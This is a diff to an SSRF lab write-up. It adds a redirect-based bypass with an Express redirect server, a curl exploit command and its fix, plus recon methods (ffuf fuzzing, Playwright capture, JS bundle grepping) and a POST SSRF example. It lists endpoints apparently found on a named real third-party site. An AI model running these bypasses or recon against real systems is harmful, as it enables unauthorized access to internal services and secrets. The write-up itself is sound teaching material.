@@ -597,11 +597,140 @@ const response = await axios.get(`http://${ip}:${parsed.port}${parsed.pathname}`
 
 ---
 
-## What's Next — Bypass Techniques
 
-- [x] **DNS Rebinding** ✅
-- [ ] **Redirect-based bypass** — public server that redirects to `127.0.0.1`
-- [ ] **Protocol smuggling** — `file://`, `gopher://`, `dict://` payloads
+
+## Bypass #2 — Redirect-Based
+
+### What it is
+
+The patched server validates the URL and checks the IP — but then follows redirects automatically. If the URL passes validation but redirects to an internal IP, the server blindly follows it.
+
+```
+Validate → attacker.com → public IP → passes ✅
+Request  → attacker.com → 301 redirect → http://127.0.0.1:8888/admin
+Server follows redirect → hits internal network ✅
+```
+
+### Setup
+
+```js
+// redirect-server.js
+const express = require('express');
+const app = express();
+
+app.get('/redirect', (req, res) => {
+  res.redirect('http://127.0.0.1:8888/admin');
+});
+
+app.listen(9999, () => console.log('Redirect server on port 9999'));
+```
+
+Expose publicly via cloudflared, then:
+
+```bash
+curl "http://localhost:4000/fetch?url=https://YOUR_TUNNEL.trycloudflare.com/redirect"
+```
+
+### Result
+
+```json
+{"data":{"message":"TOP SECRET ADMIN PANEL","users":["root","admin","dbuser"],"db_password":"sup3r_s3cr3t_123"}}
+```
+
+### The fix
+
+```js
+const response = await axios.get(url, { maxRedirects: 0 });
+if (response.status >= 300 && response.headers.location) {
+  await validateURL(response.headers.location); // validate redirect target too
+}
+```
+
+---
+
+## Recon — Finding SSRF Endpoints
+
+### 1. ffuf — Active Brute Force
+
+```bash
+ffuf -u "https://target.com/FUZZ" \
+  -w ssrf-wordlist.txt \
+  -mc 200,201,400,401,403,500,502 \
+  -fs COMMON_SIZE \
+  -t 5 -p 0.5 -c
+```
+
+> Always use -t 5 -p 0.5 — aggressive scanning DDoSd a real server during this lab.
+
+### 2. Playwright — Passive Traffic Interception
+
+```js
+const { chromium } = require('playwright');
+const endpoints = [];
+
+(async () => {
+  const browser = await chromium.launch({ headless: false });
+  const page = await (await browser.newContext()).newPage();
+
+  page.on('request', request => {
+    const url = request.url();
+    if (url.includes('your-target.com')) {
+      endpoints.push({ method: request.method(), url, body: request.postData() });
+    }
+  });
+
+  await page.goto('https://your-target.com');
+  await page.waitForTimeout(60000);
+
+  endpoints.forEach(e => {
+    console.log(`${e.method} ${e.url}`);
+    if (e.body) console.log('Body:', e.body);
+  });
+
+  await browser.close();
+})();
+```
+
+### 3. JS Bundle Analysis
+
+```bash
+# Find bundle
+curl -s "https://target.com" | grep -oP 'src="[^"]+\.js"'
+
+# Extract all endpoints
+curl -s "https://target.com/static/js/main.XXX.js" | \
+  grep -oP '["'"'"'`]/[a-zA-Z0-9/_-]+["'"'"'`]' | sort -u
+```
+
+Found on cybernetics.afrimergetech.com without a single attack request:
+```
+/api/ai/chat, /api/ai/models, /api/secrets, /api/profile,
+/api/files/delete, /api/video-call/token, /dev/poll ...
+```
+
+> Passive recon reveals more than brute force and never triggers rate limiting.
+
+---
+
+## SSRF via POST
+
+SSRF works with any HTTP method. The vulnerability is in where the server fetches, not how you deliver the URL.
+
+```bash
+curl -X POST "http://localhost:3000/fetch" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://127.0.0.1:8888/admin"}'
+```
+
+Common POST-based SSRF in real apps: webhooks, PDF generators, import features, link previews.
+
+---
+
+## What's Next
+
+- [x] DNS Rebinding
+- [x] Redirect-based bypass
+- [ ] Protocol smuggling — file://, gopher://, dict:// payloads
 
 ---
 
